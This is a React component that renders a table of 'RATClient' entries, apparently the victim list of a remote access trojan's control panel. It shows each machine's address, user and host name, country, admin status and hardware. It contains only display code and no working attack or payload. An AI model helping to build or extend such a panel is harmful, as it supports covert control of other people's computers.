import {
  IconDeviceDesktop,
  IconBrandWindows,
  IconBrandUbuntu,
} from "@tabler/icons-react";
import { RATClient, FilterCategories } from "../../../types";
import { useState, useEffect } from "react";

import { CpuSvg, GpuSvg, RamSvg, StorageSvg } from "./Svgs";

export const ClientsTable = ({
  filteredClients,
  handleContextMenu,
  setSelectedClientDetails,
  selectedClientDetails,
  searchTerm,
  filters,
}: {
  filteredClients: RATClient[];
  handleContextMenu: (
    e: React.MouseEvent<HTMLTableCellElement>,
    addr: string,
    clientFullName: string
  ) => void;
  setSelectedClientDetails: (client: RATClient) => void;
  selectedClientDetails: RATClient | null;
  searchTerm: string;
  filters: FilterCategories;
}) => {
  const getOsIcon = ({ client }: { client: RATClient }) => {
    if (client.os.toLowerCase().includes("windows")) {
      return <IconBrandWindows size={20} className="text-blue-400" />;
    } else if (
      client.os.toLowerCase().includes("linux") ||
      client.os.toLowerCase().includes("ubuntu")
    ) {
      return <IconBrandUbuntu size={20} className="text-orange-400" />;
    } else {
      return <IconDeviceDesktop size={20} className="text-gray-400" />;
    }
  };

  const fetchGpus = (gpus: string[]) => {
    let gpuString = "";

    gpus.forEach((gpu) => {
      gpuString += `${gpu}\n`;
    });

    return gpuString;
  };

  // Get country flag SVG path based on country code
  const getCountryFlagPath = (countryCode: string) => {
    if (!countryCode || countryCode === "N/A") return "";

    const code = countryCode.toLowerCase();
    return `/country_flags/${code}.svg`;
  };

  return (
    <div className="overflow-hidden">
      <div
        className="max-h-[calc(100vh-150px)] overflow-auto clients-table"
        style={{
          /* Firefox */
          scrollbarWidth: "thin",
          scrollbarColor: "rgba(156, 163, 175, 0.5) transparent",
        }}
      >
        <table className="min-w-full border-separate border-spacing-0">
          <thead className="sticky top-0 z-10">
            <tr>
              <th
                scope="col"
                className="sticky top-0 z-10 border-b bg-white/90 py-3.5 pr-3 pl-4 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:pl-6 lg:pl-8 rounded-tl-lg"
              >
                Address
              </th>
              <th
                scope="col"
                className="sticky top-0 z-10 hidden border-b bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:table-cell"
              >
                Group
              </th>
              <th
                scope="col"
                className="sticky top-0 z-10 hidden border-b bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:table-cell"
              >
                Country
              </th>
              <th
                scope="col"
                className="sticky top-0 z-10 hidden border-b bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter sm:table-cell"
              >
                PC Name
              </th>
              <th
                scope="col"
                className="sticky top-0 z-10 hidden border-b bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter lg:table-cell"
              >
                Type
              </th>
              <th
                scope="col"
                className="sticky top-0 z-10 border-b bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter"
              >
                Operating System
              </th>
              <th
                scope="col"
                className="sticky top-0 z-10 border-b bg-white/90 px-3 py-3.5 text-left font-semibold text-gray-900 backdrop-blur-sm backdrop-filter rounded-tr-lg"
              >
                Hardware
              </th>
            </tr>
          </thead>
          <tbody>
            {filteredClients.length > 0 ? (
              <>
                {filteredClients.map((client) => (
                  <tr
                    key={client.addr}
                    onContextMenu={(e) =>
                      handleContextMenu(
                        e as any,
                        client.addr,
                        `${client.username}@${client.hostname}`
                      )
                    }
                    onClick={() => setSelectedClientDetails(client)}
                    className={`cursor-pointer transition hover:bg-[#1f1f1f] ${
                      selectedClientDetails === client ? "bg-[#2a2a2a]" : ""
                    }`}
                  >
                    <td className="border-b border-accentx py-4 pr-3 pl-4 font-medium whitespace-nowrap text-white sm:pl-6 lg:pl-8">
                      {client.addr}
                    </td>
                    <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
                      {client.group}
                    </td>
                    <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
                      {client.country_code && client.country_code !== "N/A" ? (
                        <div className="flex items-center gap-2">
                          <img
                            src={getCountryFlagPath(client.country_code)}
                            alt={client.country_code}
                            className="w-6 h-4 object-cover"
                          />
                          <span>{client.country_code}</span>
                        </div>
                      ) : (
                        "N/A"
                      )}
                    </td>
                    <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white sm:table-cell">
                      <div className="flex items-center gap-3">
                        {getOsIcon({ client })}
                        {client.username}@{client.hostname}
                      </div>
                    </td>
                    <td className="hidden border-b border-accentx px-3 py-4 whitespace-nowrap text-white lg:table-cell">
                      {client.is_elevated ? "Admin" : "User"}
                    </td>
                    <td className="border-b border-accentx px-3 py-4 whitespace-nowrap text-white">
                      {client.os}
                    </td>
                    <td className="border-b border-accentx px-3 py-4 whitespace-nowrap text-white">
                      <div className="flex items-center gap-2">
                        <div
                          className="tooltip tooltip-left"
                          data-tip={client.cpu}
                        >
                          <CpuSvg />
                        </div>
                        <div
                          className="tooltip tooltip-left"
                          data-tip={client.ram}
                        >
                          <RamSvg />
                        </div>
                        <div
                          className="tooltip tooltip-left"
                          data-tip={fetchGpus(client.gpus)}
                        >
                          <GpuSvg />
                        </div>
                        <div
                          className="tooltip tooltip-left"
                          data-tip={client.storage}
                        >
                          <StorageSvg />
                        </div>
                      </div>
                    </td>
                  </tr>
                ))}
              </>
            ) : (
              <tr>
                <td colSpan={7} className="px-6 py-10 text-center text-white">
                  {searchTerm ||
                  (Object.values(filters) as Record<string, boolean>[]).some(
                    (category) => Object.values(category).includes(false)
                  )
                    ? "No clients match the current filters"
                    : "No clients available"}
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
};
